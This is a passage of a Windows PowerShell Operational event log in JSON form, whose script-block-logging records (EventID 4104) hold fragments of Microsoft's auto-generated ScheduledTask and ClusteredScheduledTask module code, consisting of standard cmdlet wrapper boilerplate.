[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n   ",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413165Z"
    },
    "EventRecordID": 87,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 11,
    "MessageTotal": 12,
    "ScriptBlockText": "       $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByUser', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Start-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Path', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Path', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Path', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StartByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Path') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StartByPath', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Stop-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Path', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Path', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Path', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StopByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Path') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; Param",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.413171Z"
    },
    "EventRecordID": 88,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-4D9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 12,
    "MessageTotal": 12,
    "ScriptBlockText": "eterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StopByPath', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Stop-ScheduledTask' -Alias '*'\r\n        \r\n",
    "ScriptBlockId": "57f72093-4163-4974-89ca-f2b6f8e7f653",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.436348Z"
    },
    "EventRecordID": 89,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-5C9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 6,
    "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/PS_ClusteredScheduledTask'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Get0', Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Get0', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Get0', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum]\r\n    ${TaskType},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = 